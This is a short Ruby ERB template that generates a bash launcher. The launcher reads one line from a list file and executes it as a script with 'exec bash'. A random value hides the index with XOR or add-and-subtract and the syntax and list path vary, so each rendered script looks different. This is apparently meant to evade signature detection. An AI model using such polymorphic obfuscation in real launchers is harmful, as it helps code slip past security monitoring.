#!/usr/bin/env bash
# <% rx = rand(512); %>
set -e
export C="${C}<%= params[:checksum] %>"
#<% if rx % 4 == 0 %>
n=$(head -n "$((<%= params[:index] ^ rx %> ^ <%= rx %>))" "/<%= [params[:list_path], '$LP'].sample %>" | tail -n 1);
exec bash "/$n" #<% else %>
n=`head -n "$((<%= params[:index] + rx %> - <%= rx %>))" "/<%= [params[:list_path], '$LP'].sample %>" | tail -n 1`;exec bash "/$n" #<% end %>
